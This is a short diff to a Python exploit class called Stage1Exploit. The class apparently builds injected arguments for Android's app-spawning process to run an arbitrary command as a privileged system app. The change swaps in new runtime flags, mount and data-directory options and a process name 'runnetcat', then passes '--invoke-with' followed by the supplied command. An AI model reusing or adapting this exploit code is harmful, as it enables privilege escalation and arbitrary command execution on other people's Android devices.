@@ -192,8 +192,11 @@ class Stage1Exploit:
             "--setgroups=3003",
             "--runtime-args",
             "--seinfo=platform:isPrivApp:priv_app:targetSdkVersion=28:complete",
-            "--runtime-flags=1",
-            "--nice-name=com.qualcomm.location.XT",
+            "--runtime-flags=2049",
+            "--mount-external-default",
+            "--instruction-set=arm",
+            "--app-data-dir=/data/",
+            "--nice-name=runnetcat",
             "--invoke-with",
             f"{command}#",
         ]
